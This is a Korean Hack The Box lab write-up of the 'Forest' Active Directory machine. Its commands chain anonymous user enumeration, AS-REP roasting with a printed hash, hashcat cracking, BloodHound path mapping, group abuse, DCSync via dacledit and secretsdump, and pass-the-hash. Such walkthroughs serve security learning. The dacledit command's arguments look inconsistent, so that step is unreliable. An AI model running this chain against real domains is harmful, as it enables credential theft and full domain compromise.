# HTB-FOREST
```bash
OS: Windows(AD)
DATE: 26.08.26
DIFFICULTY: Easy
```

## RECON
**nmap**: 전체 포트 검사 후, 각 포트별 상세 정보(버전 등)를 검사
```bash
nmap -p- -T4 IP
```
```bash
nmap -sC -sV -p PORTS IP
```
- 결과: 53(domain), 88(kerberos), 135, 139, 389, 445(smb), 464, 3268(ldap), 47001(winrm) 등

## Initial Access
**nxc 사용**: nxc를 사용하여 익명 조회가 가능한지 먼저 확인한 후, `--pass-pol` 옵션을 통해 비밀번호 정책을 확인했다.
```bash
nxc smb IP -u '' -p ''
nxc smb IP -u '' -p '' --pass-pol
```
비밀번호 정책상 account lock이 none이었다. 따라서 `--users` 옵션을 통해 기본 유저 목록을 얻었다.
```bash
nxc smb IP -u '' -p '' --users
```
여러 유저명을 얻게 되었고, 그중 5명의 username을 추려 users.txt를 만든 후 AS-REP Roasting 공격을 시도해보았다.
```bash
nxc ldap IP -u users.txt -p '' --asreproast asrep.out
```
```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:90ca6982d9de874230b47e344680ebe4$85d57f5212524c2760c8c1c496b017ceaac11888390006cc0b922c0edfadbfb3ffd087726fb4869d77497c763beef955fef5e1582fea1ee109142e4ef4f8b6b01fc68e3b6fe053aa237ee91cd1f54bd42dea64bbe8a83a8acb8b62eb6b8138e331ffb06a0c4429c97992039425b634acc259116bd24f5a6bef0374e8d67c5fcb61cb9cc9afde70b4983b5a27ac45d42d01b8b0b56bef21f18f69ab79586e23eb88e2a9aa92bf81cddcaf2672b8786ab4bbd242582f85765284bc8ebf6a8037c4a5d8899a2c1f0e4459c87fdc0ac66812b6fe423161d1b187a5c3cdc32e70583f45e85ca1152c
```
svc-alfresco 유저의 AS-REP 해시가 나왔고, hashcat 18200 모드로 크래킹했다.
```bash
hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
이를 통해 svc-alfresco 유저의 비밀번호를 얻을 수 있었고, 이후 winrm을 통해 접근을 시도했다.
```bash
evil-winrm -i IP -u svc-alfresco -p PASS
```
evil-winrm을 통해 초기 접근에 성공했다.

![initial shell](attach/_Attachments/Pasted%20image%2020260826181417.png)

## Privilege Escalation
이후 권한 상승을 위해 리눅스에서 대상 도메인의 BloodHound 정보를 수집했다.
```bash
bloodhound-python -u svc-alfresco -p PASS -d htb.local -ns IP
```
```bash
bloodhound -start
```
이후 BloodHound GUI를 연 다음, svc-alfresco 계정부터 Domain Admin까지의 공격 경로를 조회해보았다.

![bloodhound](attach/_Attachments/Pasted%20image%2020260826190402.png)

위 그래프를 통해 svc-alfresco 계정이 Service Accounts 그룹에 속하고, 이 그룹은 Privileged IT Accounts 그룹에 속함을 확인했다. 또한 이 그룹은 Account Operators 그룹에 속해 있었고, Account Operators는 Exchange Windows Permissions 그룹에 대해 GenericAll 권한을 가지고 있어 해당 그룹에 임의의 유저를 추가할 수 있었다.
```bash
net rpc group addmem "Exchange Windows Permissions" svc-alfresco -U htb.local/svc-alfresco%PASS -S DOMAIN_IP
```
```bash
net group "Exchange Windows Permissions" /domain
```
그룹에 svc-alfresco 계정을 추가한 후, Exchange Windows Permissions 그룹이 도메인 객체에 대해 WriteDacl 권한을 가지고 있음을 이용해 DCSync 공격을 시도했다.
```bash
dacledit.py -action 'write' -rights 'DCSync' -principal 'Administrator' -target-dn 'DC_IP' 'htb.local'/'svc_alfresco':'password'
```
```bash
secretsdump 'htb.local'/'svc-alfresco':'PASSWORD'@'DC_IP' -just-dc-user Administrator
```
이로써 Domain Admin 계정의 NTLM 해시를 얻었고, 이후 winrm을 통해 Pass-the-Hash로 Domain Admin 접근에 성공했다.

![root](attach/_Attachments/Pasted%20image%2020260826185405.png)

## New Inform
BloodHound를 통해 취약한 권한 관계를 어떻게 파악하고 활용할 수 있는지 새롭게 알게 되었고, AS-REP Roasting 공격을 항상 시도해봐야 한다는 것을 배웠다.